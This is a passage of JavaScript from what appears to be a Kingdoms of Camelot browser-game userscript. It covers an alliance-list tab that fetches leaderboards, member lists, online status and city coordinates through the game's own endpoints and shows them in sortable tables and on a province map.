	<tbody id=allBody style="background-color:#ffffff;"></tbody></table></div>\
	<DIV  width:100%; style="top:670px; left:0px; position:absolute; background-color:#ffffff; border-top:1px solid; margin-top:8px; color:#700; font-weight:bold;">';
	document.getElementById('allListOut').innerHTML = m;  //style="top:670px; left:0px; position:absolute;
	document.getElementById('altInput').innerHTML = '<HR><TABLE width=100% cellpaddding=0><TR align=center>\
	<TD class=xtab>'+culang.distance+' '+culang.from+': &nbsp; X: <INPUT size=2 type=text id=plyrX /> Y: <INPUT size=2 type=text id=plyrY /> &nbsp;<span id=dmcoords></span></td></tr></table>';
	document.getElementById('clickCol'+t.sortColNum).className = 'clickable clickableSel';

    t.reDisp();
    new CdispCityPicker ('plyrdcp', document.getElementById ('dmcoords'), true, t.eventCoords, 0).bindToXYboxes(document.getElementById('plyrX'), document.getElementById('plyrY'));
    document.getElementById('idFindETASelect').disabled = false;
  },

  gotPlayerLastLogin : function (rslt, span){
    var t = Tabs.AllianceList;
    if (!rslt.ok){
      span.innerHTML = rslt.errorMsg;
      return;
    }

    var p = rslt.playerInfo;
    var lastLogin = rslt.playerInfo.lastLogin;
    
    if (lastLogin) {
      m = '<span style="color:green">'+lastLogin+'</span>';
    } else {
       m = '<span style="color:red">-</span>';
    }  
    span.innerHTML = m + '';
  }, 
  gotPlayerDetail : function (rslt, span){
    var t = Tabs.AllianceList;
    if (!rslt.ok){
      span.innerHTML = rslt.errorMsg;
      return;
    }
    var u = rslt.userInfo[0];
    var a = 'Niemand';
    if (u.allianceName)
      a = u.allianceName +' ('+ getDiplomacy(u.allianceId) + ')';
    var m = '<TABLE cellspacing=0 class=pdxTab><TR><TD><B>'+culang.details+':</b> &nbsp; </td><TD>'+culang.alliance+': '+ a +' &nbsp; '+culang.cities+': '
          + u.cities +' &nbsp; '+culang.pop+': '+ u.population +'</td></tr><TR><TD></td><TD>'+culang.STprov+': ';
    var pids = u.provinceIds.split (',');
    var p = [];
    for (var i=0; i<pids.length; i++)
      p.push(unsafeWindow.provincenames['p'+pids[i]]);
    span.innerHTML = m + p.join (', ') +'</td></tr></table>';
  },

  aName : '',
  eventSubmit : function (){
    var t = Tabs.AllianceList;
    document.getElementById('ptallErr').innerHTML='';
    t.aName = document.getElementById('allAllName').value;
    if (t.aName.length < 3){
      document.getElementById('ptallErr').innerHTML = ''+culang.minimp+'';
      return;
    }
    var myA = getMyAlliance ();
    document.getElementById('altInput').innerHTML = '';
    document.getElementById('allListOut').innerHTML = '<BR><BR><CENTER><b>'+culang.searchleaderboard+'</b></center>';
    if (myA[0]!=0 && myA[1].toLowerCase().indexOf(t.aName.toLowerCase())>=0 )
      t.fetchAllianceList (t.aName, myA[0], t.eventGotAllianceList);
    else
      t.fetchAllianceList (t.aName, null, t.eventGotAllianceList);
  },
  eventListSubmit : function (){
    var t = Tabs.AllianceList;
    var myA = getMyAlliance ();
    document.getElementById('allListOut').innerHTML = '<BR><BR><CENTER><b>'+culang.searchallynote+'</b> </center>';
    if (myA[0]!=0  ) {
       t.curPage=1;
       t.fetchOtherAllianceInfo ( 1, t.eventGotOtherAlliancePage);
       document.getElementById('allGotoPage').disabled = false;
    }
    else {
       document.getElementById('allListOut').innerHTML = '<blink><b>'+culang.uneedally+'</b></blink>';
    }
  },
  eventListTHSubmit : function (){
      var t = Tabs.AllianceList;
      document.getElementById('allListOut').innerHTML = '<BR><BR><CENTER><b>'+culang.createtop100+'</b> </center>';
      t.fetchUserLeaderboard (1, t.eventGetUserLeaderboard);
  },
  eventGotAllianceList : function (rslt){
    var t = Tabs.AllianceList;
    if (!rslt.ok){
      document.getElementById('allListOut').innerHTML = rslt.errorMsg;
      return;
    }
    var m = '<DIV class=pdxStat>'+culang.Hfound+' <B>"'+ t.aName +'"</b></div>\
    <TABLE><TR style="font-weight:bold"><TD class=xtab>'+culang.alliance+' '+culang.name+'</td><TD class=xtab>'+culang.rank+'</td><TD class=xtab>'+culang.player+'</td>\
        <TD align=right class=xtab>'+culang.might+'</td><TD class=xtab>'+culang.diplo+'</td><TD class=xtab></td></tr>';
    for (k in rslt.alliancesMatched){
      var all = rslt.alliancesMatched[k];
      var dip = '';
      if (all.relation && all.relation==1)
        dip = ''+culang.friendly+'';
      else if (all.relation && all.relation==2)
        dip = ''+culang.hostile+'';
      m += '<TR><TD class=xtab>'+ all.allianceName +'</td><TD align=right class=xtab>'+ all.ranking +'</td><TD align=right class=xtab>'+ all.membersCount +'</td>\
       <TD align=right class=xtab>'+ addCommasInt(all.might) +'</td><TD class=xtab>'+ dip +'</td>\
       <TD class=xtab><a onclick="pdxGetMembers('+ all.allianceId +')"> '+culang.playershow+'</a></td>\
	   <TD class=xtab><a onclick="PTPaintMembers('+ all.allianceId +')">'+culang.map+'</a></td></tr>';
    }
    document.getElementById('allListOut').innerHTML = m;
  },
  
 showMyAlliance : function (){
    var t = Tabs.AllianceList;
    var myA = getMyAlliance ();
    document.getElementById('allListOut').innerHTML = '<BR><BR><CENTER><b>'+culang.searchleaderboard+'</center>';
    if (myA[0]!=0  ) {
       t.eventGetMembers(myA[0]);
    }
    else {
       document.getElementById('allListOut').innerHTML = '<blink><b>'+culang.uneedally+'</b></blink>';
    }
  },
 curPage : 0,
  MaxPage : 0,

  eventListNext : function (amt){
    var t = Tabs.AllianceList;
    if( parseInt(amt) >= 9999 )
       t.curPage = t.MaxPage;
    else {
	    t.curPage = parseInt(t.curPage) + parseInt(amt);
	    if ( t.curPage > t.MaxPage) {
	      t.curPage = t.MaxPage;
	    }
    }
    document.getElementById('allListOut').innerHTML = '<BR><BR><CENTER> <b>'+culang.nextpage+'</b></center>';
    t.fetchOtherAllianceInfo (t.curPage, t.eventGotOtherAlliancePage);
  },

  eventListPrev : function (amt){
    var t = Tabs.AllianceList;
    if(amt <= -1)
       t.curPage = 1;
    else {
	    t.curPage-=amt;
	    if ( t.curPage < 1 ) {
	      t.curPage = 1;
	    }
    }
    document.getElementById('allListOut').innerHTML = '<BR><BR><CENTER> <b>'+culang.prevpage+'</b></center>';
    t.fetchOtherAllianceInfo (t.curPage, t.eventGotOtherAlliancePage);
  },

  gotoPage : function (){
    var t = Tabs.AllianceList;
    var val = document.getElementById('idPageNum').value;
    if (t.MaxPage < 0 ) {
      document.getElementById('allListOut').innerHTML = '<BR><BR><CENTER><b>'+culang.firstcallally+'</b></center>';
      return;
    }
    if (t.MaxPage < 0 || val > t.MaxPage || val < 1) {
      document.getElementById('allListOut').innerHTML = '<BR><BR><CENTER><blink><b>'+culang.nopage+'</b></blink></center>';
      return;
    }
    t.curPage = val;
    document.getElementById('allListOut').innerHTML = '<BR><BR><CENTER><b>'+culang.holdline+'</b></center>';
    t.fetchOtherAllianceInfo (t.curPage, t.eventGotOtherAlliancePage);
  },
  
  eventGetUserLeaderboard: function(rslt) {
   var t = Tabs.AllianceList;
      if (!rslt.ok){
        document.getElementById('allListOut').innerHTML = rslt.errorMsg;
        return;
    }
    var m = '<div style="overflow:auto; height:756px;width:700px;"><TABLE width="700"><thead><TR style="font-weight:bold">           <th class=xtab>'+culang.rank+'</th><th class=xtab>'+culang.avatar+'</th><th>'+culang.name+'</th><th class=xtab>'+culang.might+'</th>          <th class=xtab>'+culang.alliance+'</th><th class=xtab>'+culang.cities+'</th><th class=xtab></th></tr></thead><tbody>';
    document.getElementById('allListOut').innerHTML = m;
    for (var i=0; i<rslt.results.length; i++) {
     var resultat = rslt.results[i];
    
     m += '<TR class=xtab><TD class=xtab align=center><b>' + resultat.rank +'</b></td>                <td class=xtab><a onclick=pdxGetMember("' + resultat.displayName +'");><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/avatars/25/' + resultat.playerSex + '' + resultat.avatarId + '.jpg"></a></td>     		<TD class=xtab>' + resultat.displayName +'</td>     		<td class=xtab>' + resultat.might + '</td>     		<td class=xtab><a onclick="pdxGetMembers('+ resultat.allianceId +')">' + resultat.allianceName + '</a></td>     		<td class=xtab>' + resultat.numCities + '</td>     		</tr>';
     m += '</div>';
     document.getElementById('allListOut').innerHTML = m;
    }
  },
  fetchUserLeaderboard: function(pagNum, notify) {
        var t = Tabs.AllianceList;
        var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
        params.page = pagNum;
        params.perPage = 100;
        new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getUserLeaderboard.php" + unsafeWindow.g_ajaxsuffix, {
          method: "post",
          parameters: params,
          onSuccess: function (rslt) {
            notify (rslt);
          },
          onFailure: function (rslt) {
            notify (rslt);
          },
      });
  },
  
  
  eventGotOtherAlliancePage : function (rslt){
    var t = Tabs.AllianceList;
    if (!rslt.ok){
      document.getElementById('allListOut').innerHTML = rslt.errorMsg;
      return;
    }

    document.getElementById('idPageNum').value = t.curPage;

    t.MaxPage=rslt.noOfPages;

    var m = '<div style="overflow:auto; height:700px;width:600px;"><TABLE width="600"><thead><TR style="font-weight:bold">         <th class=xtab>'+culang.alliance+' '+culang.name+'</th><th class=xtab>'+culang.rank+'</th><th class=xtab>'+culang.name+'</th>        <th align=right class=xtab>'+culang.might+'</th><th class=xtab>'+culang.diplo+'</th><th class=xtab></th></tr></thead><tbody>';
    document.getElementById('allListOut').innerHTML = m;

    for (var i=0; i<rslt.otherAlliances.length; i++) {
      var alliance = rslt.otherAlliances[i];
      var dip = '';
      dip = getDiplomacy(alliance.allianceId);//A2

      m += '<TR class="'+ dip + '"><TD class=xtab>' + alliance.name +'</td><TD align=right class=xtab>'+ alliance.ranking +'</td><TD align=right class=xtab>'+ alliance.membersCount +'</td>       <TD align=right class=xtab>'+ addCommasInt(alliance.might) +'</td><TD class=xtab>'+ dip +'</td>       <TD class=xtab><a onclick="pdxGetMembers('+ alliance.allianceId +')">'+culang.playershow+'</a></td>	   <TD class=xtab><a onclick="PTPaintMembers('+ alliance.allianceId +')">'+culang.map+'</a></td></tr>';
    }
	m += '</tbody></TABLE><div style="font-weight:bold; height:20px;width:560px;text-align:center;"><span><center>	<a onclick="pdxPrevClick(-1)"> <img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/firstpage.png title="'+culang.firstp+'" ></a>	<a onclick="pdxPrevClick(10)"> <img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/back10.png title="-10"></a>	<a onclick="pdxPrevClick(5)"> <img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/back5.png title="-5"></a>	<a onclick="pdxPrevClick(1)"> <img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/back.png title="'+culang.back+'"></a> 	<a onclick="pdxNextClick(1)"> <img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/next.png title="'+culang.nextp+'"></a>	<a onclick="pdxNextClick(5)"> <img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/next5.png title="+5"></a>	<a onclick="pdxNextClick(10)"> <img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/next10.png title="+10"></a>	<a onclick="pdxNextClick(9999)"> <img src=http://koc-power-pdx.googlecode.com/svn/trunk/img/lastpage.png title="'+culang.lastp+'"></a> </span></div>';
	m += '</div>';
    document.getElementById('allListOut').innerHTML = m;
 },

  showCurrentPage : function (){
    var t = Tabs.AllianceList;
    var myA = getMyAlliance ();

    document.getElementById('allListOut').innerHTML = '<BR><BR><CENTER>'+culang.searchingnow+' </center>';
    if (myA[0]!=0  ) {
       t.fetchOtherAllianceInfo ( t.curPage, t.eventGotOtherAlliancePage);
    }
    else {
       t.fetchOtherAllianceInfo ( t.curPage, t.eventGotOtherAlliancePage);
    }

  },

  eventGotMemberList : function (rslt){
     var t = Tabs.AllianceList;
     if (!rslt.ok){
       document.getElementById('allListOut').innerHTML = rslt.errorMsg;
       return;
     }
     t.memberListRslt = rslt;
     var uList = [];
     for (k in rslt.results)
       uList.push (rslt.results[k].userId);     
     t.fetchPlayerStatus (uList, function(r){t.eventGotMemberOnlineList(r)});    
   },    
     
  eventGotMemberOnlineList : function (rslt){
    var t = Tabs.AllianceList;
    var numInvalid = 0;
    var numPlayers = 0;
    var myA = getMyAlliance ();
    t.dat = [];
    for (var i=0; i<t.memberListRslt.results.length; i++){
      p = t.memberListRslt.results[i];
      if (p.userId == 0){
        ++numInvalid;
      } else {
        ++numPlayers;
        if ( myA[0] == p.allianceId)
          t.friendEta = true;
	        else
           t.friendEta = false;
        for (var c=0; c<p.cities.length; c++){
           t.dat.push ([p.displayName, parseInt(p.might), p.officerType, parseInt(p.numCities), parseInt(p.cities[c].tileLevel),
               parseInt(p.cities[c].xCoord), parseInt(p.cities[c].yCoord), p.cities[c].cityName, 0, c, p.userId, p.avatarId, p.playerSex, p.rank, rslt.data[p.userId]?1:0, 'NA']);
        }
      }
    }
    t.setDistances (Cities.cities[0].x, Cities.cities[0].y);
    t.ModelCity=Cities.cities[0];
    t.setEta();
    t.displayMembers (t.memberListRslt.allianceName, numPlayers);
  },

  // sort and display
  reDisp : function (){
    var t = Tabs.AllianceList;
    
    function sortFunc (a, b){
          var t = Tabs.AllianceList;
     if (typeof(a[t.sortColNum]) == 'number'){
             if (t.sortDir > 0)
               return a[t.sortColNum] - b[t.sortColNum];
             else
               return b[t.sortColNum] - a[t.sortColNum];
           } else if (typeof(a[t.sortColNum]) == 'boolean'){
         
     	return 0;        
           } else {
             if (t.sortDir > 0)
               return a[t.sortColNum].localeCompare(b[t.sortColNum]);
             else
               return b[t.sortColNum].localeCompare(a[t.sortColNum]);
      }
    }
    t.dat.sort (sortFunc);
    var m = '';
    var tbody = document.getElementById('allBody');
    tbody.innerHTML ='';
    tbody.style.maxHeight = '';
    var csvXL="";
    for (var i=0; i<t.dat.length; i++){ //
    	if (i % 2 == 0) {
        		 tabclass = 'xxtab';
        	} else {
        		tabclass = 'xxtab_even';
    	} 
        m += '<TR style="max-height:30px"><TD class=xxtab><a onclick=pdxGetMember("' +  t.dat[i][0] +'");><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/avatars/25/'+t.dat[i][12]+''+t.dat[i][11]+'.jpg" align=absmiddle></a>&nbsp;<a onclick=getInfoForAnUser("'+ t.dat[i][10] +'");>'+ t.dat[i][0] +'</a></td><TD align=right class='+ tabclass +'>'+ addCommasInt(t.dat[i][1]) +'</td><TD align=center class='+ tabclass +'>'+ t.dat[i][3] +'</td>\
	                <TD class='+ tabclass +'><span title="'+culang.player+': '+t.dat[i][13]+' ">'+ officerId2String(t.dat[i][2]) +'</span></td><TD class=xxtab>'+ (t.dat[i][14]?'<SPAN class=boldGreen>'+culang.Honline+'</span>':'') +'</td><TD class='+ tabclass +'>'+ t.dat[i][7] +'</td><TD align=right class='+ tabclass +'>'+ t.dat[i][4] +'</td>\
	                <TD align=center class='+ tabclass +'><DIV>'+pdxkoordlink(t.dat[i][5],t.dat[i][6])+'</div></td><TD align=right class=xxtab style="padding-right:20px;">'+ t.dat[i][8].toFixed(2) +'</td>';
       	 m += '<TD  nowrap class=xxtab>'+ (t.dat[i][15]?'<SPAN>'+ (t.dat[i][15]>0?timestr(t.dat[i][15],1):'NA') +'</span>':'<SPAN>NA</span>') +'</td><td class='+ tabclass +'><SPAN onclick="pdxPlyLogin(this, \''+ t.dat[i][10] +'\');"><A>'+culang.lastlogin+'</a></span><td></tr>';
	csvXL += t.dat[i][0]+';'+t.dat[i][1]+';'+t.dat[i][5]+';'+t.dat[i][6]+';'+t.dat[i][4]+';'+t.dat[i][8]+';'+t.dat[i][7]+'\n';
    }
    m += '<tr><td colspan=11><HR><b>'+culang.exportply+'</b> ('+culang.expformat+')<BR><textarea cols="55" rows="12" onclick="this.focus();this.select();" id="cutAndPaste" name="csv">'+culang.player+';'+culang.might+';X;Y;'+culang.level+';'+culang.distance+';'+culang.cities+'\n'+csvXL+'</textarea><br><bR></tr>';
   
   var tbody = document.getElementById('allBody');
    tbody.style.maxHeight = '';
    tbody.innerHTML = m;
    document.getElementById("cutAndPaste").innerHTML=csvXL;
    if (parseInt(tbody.clientHeight) > 475){
      tbody.style.height = '475px';
      tbody.style.maxHeight = '475px';
    }
  },

  setDistances : function (x, y){
    var t = Tabs.AllianceList;
    for (var i=0; i<t.dat.length; i++)
      t.dat[i][8] = distance (x, y, t.dat[i][5], t.dat[i][6]);
  },

  friendEta:false,

  setEta : function (){
    var t = Tabs.AllianceList;
    for (var i=0; i<t.dat.length; i++) {
      if (t.dat[i][8]) {
        var eta = t.estETA(parseFloat(t.dat[i][8]));
        if (t.friendEta)
           t.dat[i][15] = eta.friendETA;
        else
           t.dat[i][15] = eta.ETA;
      }
    }
  },

  handleEtaSelect : function (){
    var t = Tabs.AllianceList;
    t.setEta();
    t.reDisp();
  },

  sortColNum : 1,
  sortDir : 1,

  displayMembers : function (allName, numPlayers){
    var t = Tabs.AllianceList;
    function alClickSort (e){
      var t = Tabs.AllianceList;
      var newColNum = e.id.substr(8);
      document.getElementById('clickCol'+t.sortColNum).className = 'clickable';
      e.className='clickable clickableSel';
      if (newColNum == t.sortColNum)
        t.sortDir *= -1;
      else
        t.sortColNum = newColNum;
      t.reDisp();
    }//
    unsafeWindow.PTalClickSort = alClickSort;
	
    var m = '<STYLE>.clickable{background-color:#ddd; border:2px outset; border-color:#555; padding-left:5px; padding-right:5px}\
	.clickableSel{background-color:#ffffcc;}\
	.xxtab{background-color:none; padding-left:5px; padding-right:5px;} </style>\
	<DIV class=pdxStat><TABLE id=tabAllMembers cellpadding=0  width=100%><TR font-weight:bold"><TD class=xtab> &nbsp; '+ allName +'</td>\
	<TD class=xtab width=80% align=center>'+culang.distance+' '+culang.from+' <SPAN id=distFrom>'+ Cities.cities[0].name +' ('+ Cities.cities[0].x +','+ Cities.cities[0].y +')</span></td><TD class=xtab align=right>'+culang.player+': '+ numPlayers +' &nbsp; </td></tr></table></div>';
	m += '<div style="top:350px; max-height:770px; height:670px; overflow-y:scroll;">\
	<TABLE id=tabAllMembers align=center cellpadding=0 cellspacing=0><THEAD style="overflow-y:hidden;">\
	<TR style="font-weight:bold"><TD id=clickCol0 onclick="PTalClickSort(this)" class=clickable><A><DIV>'+culang.player+'</div></a></td>\
	<TD id=clickCol1 onclick="PTalClickSort(this)" class=clickable align=center><A><DIV>'+culang.might+'</a></div></td>\
	<TD id=clickCol3 onclick="PTalClickSort(this)" class=clickable><A><DIV>#</a></div></td>\
	<TD id=clickCol2 onclick="PTalClickSort(this)" class=clickable align=center><A><DIV>'+culang.pos+'</a></div></td>\
	<TD id=clickCol14 onclick="PTalClickSort(this)" class=clickable align=center><A><DIV>'+culang.online+'</a></div></td>\
	<TD id=clickCol7 onclick="PTalClickSort(this)" class=clickable><A><DIV>'+culang.city+'</a></div></td>\
	<TD id=clickCol4 onclick="PTalClickSort(this)" class=clickable><A><DIV>'+culang.stlev+'</a></div></td>\
	<TD id=clickCol5 onclick="PTalClickSort(this)" class=clickable><A><DIV>'+culang.shrcoord+'</a></div></td>\
	<TD id=clickCol8 onclick="PTalClickSort(this)" class=clickable><A><DIV>'+culang.shrdist+'</a></div></td>\
	<TD id=clickCol15 onclick="PTalClickSort(this)" class=clickable><A><DIV>'+culang.eta+'</a></div></td>\
	<TD class=clickable><A><DIV>'+culang.lastlogin+'</div></a></td></tr></thead>\
	<tbody id=allBody ></tbody></table></div>';        
	document.getElementById('allListOut').innerHTML = m;
	document.getElementById('altInput').innerHTML = '<HR><TABLE width=100% cellpaddding=0><TR align=center>\
	<TD class=xtab>'+culang.distance+' '+culang.from+': &nbsp; X: <INPUT size=2 type=text id="plyrX" /> Y: <INPUT size=2 type=text id="plyrY" /> &nbsp; <span id=dmcoords></span></td></tr></table>';
	document.getElementById('clickCol'+t.sortColNum).className = 'clickable clickableSel';
    t.reDisp();
    new CdispCityPicker ('plyrdcp', document.getElementById ('dmcoords'), true, t.eventCoords, 0).bindToXYboxes(document.getElementById('plyrX'), document.getElementById('plyrY'));
    document.getElementById('idFindETASelect').disabled = false;
    
 },
    
 eventCoords : function (city, x, y){
    var t = Tabs.AllianceList;
    var m = '';
    if (city != null)
      m = city.name +' ('+ city.x +','+ city.y +')';
    else
      m = x +','+ y;
    var distFrom = document.getElementById('distFrom');
    if (distFrom)
        distFrom.innerHTML = m;
    t.ModelCity=city;
    t.setDistances(x,y);
    t.setEta(x,y);
    t.reDisp();
  },
  
  eventGetMembers : function (aid){
    var t = Tabs.AllianceList;
    document.getElementById('allListOut').innerHTML = '<BR><BR><CENTER><b>'+culang.searchleaderboard+'</b></center>';
    t.fetchAllianceMemberList (aid, null, t.eventGotMemberList);
  },

  fetchAllianceMemberList : function (allianceId, allianceName, notify) {
    var t = Tabs.AllianceList;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.perPage = 100;
    if (allianceName)
      params.allianceName = allianceName;
    if (allianceId && allianceId != 0)
      params.allianceId = allianceId;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getUserLeaderboard.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify (rslt);
      },
    });
  },
  GetDataForMap : function (allianceId) {
    var t = Tabs.AllianceList;
    var params = uW.Object.clone(uW.g_ajaxparams);
    var Data=[];
    params.perPage = 100;
    params.allianceId = allianceId;
    
    new MyAjaxRequest(uW.g_ajaxpath + "ajax/getUserLeaderboard.php" + uW.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
      	var city = '';
      	for (var i=0; i<rslt.results.length; i++) {
      		//alert(rslt.results[i].toSource());
      	    if (rslt.results[i]['userId'] !=0){
	      	    player = rslt.results[i]['cities'];
	      	    for (var ii=0; ii<player.length; ii++) 
	      			Data.push ({X:player[ii]['xCoord'],Y:player[ii]['yCoord']});
	    	}  	
        }
        if (Data != []) t.PaintDataOnMap(Data);
      },
      onFailure: function (rslt) {
        notify ({errorMsg:'AJAX error'});
      },
    });
  },
  
  PaintDataOnMap : function(Data){
  		var provMapCoordsA = {imgWidth:710, imgHeight:708, mapWidth:670, mapHeight:670, leftMargin:31, topMargin:19};  
  		var map = '<DIV id=ptAlliProvMap style="height:'+ provMapCoordsA.imgHeight +'px; width:'+ provMapCoordsA.imgWidth +'px; background-repeat:no-repeat; background-image:url(\''+ URL_PROVINCE_MAP +'\')"></div>';
	
		document.getElementById('allListOut').innerHTML = map;
		var eMap =  document.getElementById('ptAlliProvMap');
			
		for (var cc=0; cc<Seed.cities.length; cc++) {
		    var city = Seed.cities;
		    var Xplot = parseInt((provMapCoordsA.mapWidth * parseInt(city[cc][2])) / 750);
		    var Yplot = parseInt((provMapCoordsA.mapHeight * parseInt(city[cc][3])) / 750);
		    var cf = document.createElement ('div');
		    cf.style.background = 'black';
		    cf.style.opacity = '1.0';
		    cf.style.position='relative';
		    cf.style.display='block';
		    cf.style.width='14px';
		    cf.style.height='16px';
		    cf.style.border='1px solid #fff';
		    cf.style.color = 'white';
		    cf.style.textAlign = 'center';
		    cf.style.top = (Yplot+provMapCoordsA.topMargin-(cc*16)-8) +'px';      
		    cf.style.left = (Xplot+provMapCoordsA.leftMargin-7) +'px';
		    cf.innerHTML = (cc+1) +'';
		    eMap.appendChild(cf);	    
		}

		for (var i=0;i<Data.length;i++) {
			var x = parseInt(Data[i]['X']);
			var y = parseInt(Data[i]['Y']);
  	        var xplot = parseInt((provMapCoordsA.mapWidth * x) / 750);
  	        var yplot = parseInt((provMapCoordsA.mapHeight * y) / 750);
  	    	var ce= document.createElement ('div');
  	    		ce.style.background = 'red';
  	    		ce.style.opacity = '1.0';
  	    		ce.style.position='relative';
  	    		ce.style.display='block';
  	    		ce.style.width='4px';
  	    		ce.style.height='4px';
  	    		ce.style.color = 'white';
  	    		ce.style.textAlign = 'center';
  	    	ce.style.top = (yplot+provMapCoordsA.topMargin -(4*i)-((Seed.cities.length)*18)) +'px';      
  	    	ce.style.left = (xplot+provMapCoordsA.leftMargin -2) +'px';
  	    	//ce.innerHTML = '<span onmouseover="this.innerText='+x+','+y+'" onclick="">A</span>';
  	    	ce.innerHTML = '<DIV onclick="pdxGotoMap('+ x +','+ y +')">&nbsp;</div>';
  	        eMap.appendChild(ce);
  	   }   
  },
  fetchLeaderboard : function (uid, notify) {
    var t = Tabs.AllianceList;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.userId = uid;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getUserLeaderboard.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify (rslt);
      },
    });
  },

  fetchAllianceList : function (allianceName, myAid, notify) {   // at least 3 chars :)
    var t = Tabs.AllianceList;
    function combineResults (rsltA, rsltM, notify){
      if (!rsltA.ok){
        if (rsltA.msg.indexOf("No alliance found under")!=0 || !rsltM.ok){
          notify (rsltA);
          return;
        }
        rsltA.ok = true;
        rsltA.count = 0;
        rsltA.alliancesMatched = {};
      }
      if (rsltM.ok){
        rsltA.alliancesMatched['a'+rsltM.allianceInfo.allianceId] = {allianceId: rsltM.allianceInfo.allianceId, allianceName: rsltM.allianceInfo.allianceName,
              membersCount: rsltM.allianceInfo.members, relation: null, might: rsltM.allianceInfo.might, ranking: rsltM.allianceInfo.ranking};
        ++rsltA.count;
      }
      notify (rsltA);
    }
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.allianceName = allianceName;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/allianceGetSearchResults.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        if (myAid!=null && myAid>0)
          t.fetchMyAllianceInfo  (function (r){ combineResults (rslt, r, notify)});
        else
          notify (rslt);
      },
      onFailure: function (rslt) {
        notify (rslt);
      },
    });
  },

  fetchOtherAllianceInfo : function (pageNum, notify){    // as in alliance list, sorted by rank, 10 per page
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.pageNo = pageNum;
    params.cityId = unsafeWindow.currentcityid;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/allianceGetOtherInfo.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onSuccess: function (rslt) {
        notify (rslt);
      },
    });
  },

  fetchMyAllianceInfo : function (notify){
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/allianceGetInfo.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onSuccess: function (rslt) {
        notify (rslt);
      },
    });
  },

  fetchPlayerList : function (name, notify){  // at least 3 chars!!     UNTESTED
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.searchName = name;
    params.subType = "ALLIANCE_INVITE";
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/searchPlayers.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onSuccess: function (rslt) {
        notify (rslt);
      },
    });
  },

  fetchPlayerInfo : function (uid, notify){
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.uid = uid;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getUserGeneralInfo.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onSuccess: function (rslt) {
        notify (rslt);
      },
    });
  },
   fetchPlayerLastLogin : function (uid, notify){
      var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
      params.pid = uid;
      new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/viewCourt.php" + unsafeWindow.g_ajaxsuffix, {
        method: "post",
        parameters: params,
        onSuccess: function (rslt) {
          notify (rslt);
        },
        onSuccess: function (rslt) {
          notify (rslt);
        },
      });
  },
  fetchPlayerStatusSimple : function (uid, notify){
        var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
        params.checkArr = uid;
        new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getOnline.php" + unsafeWindow.g_ajaxsuffix, {
          method: "post",
          parameters: params,
          onSuccess: function (rslt) {
            notify (rslt);
          },
          onSuccess: function (rslt) {
            notify (rslt);
          },
        });
    },
  JumpCity:function(city) {
     		var t = Tabs.AllianceList;
     		for (i=0;i<Seed.cities.length;i++) {
     			if (Seed.cities[i][1]==city) var cityNum=i;
     		}
     		cityNum++;
     		var obj = document.getElementById('citysel_'+cityNum);
  	   	return t.ClickWin(window,obj,'click');
     },
  fetchPlayerStatus : function (uidArray, notify){
      var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
      params.checkArr = uidArray.join(',');
      new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getOnline.php" + unsafeWindow.g_ajaxsuffix, {
        method: "post",
        parameters: params,
        onSuccess: function (rslt) {
          notify (rslt);
        },
        onFailure: function (rslt) {
          notify ({errorMsg:'AJAX error'});
        },
      });
  },
  
  ModelCity : {},
  
  estETA : function(dist) { // Need Relief Station Levels to estimate transport, reinf, or reassign times. 
      var t = Tabs.AllianceList;
      var ret={ETA:0,etaStr:'NA',friendETA:0,friendEtaStr:'NA'};    
      var cityID;
      if (dist <= 0) return ret;
      var EtaType = document.getElementById('idFindETASelect');
      var baseSpeedSel = EtaType.options[EtaType.selectedIndex].value;
      var m = baseSpeedSel.split(',');
      var horse = 0;
      var baseSpeed = 0;
      if(m) {
        horse = parseInt(m[0]);
        baseSpeed = parseInt(m[1]);
      }
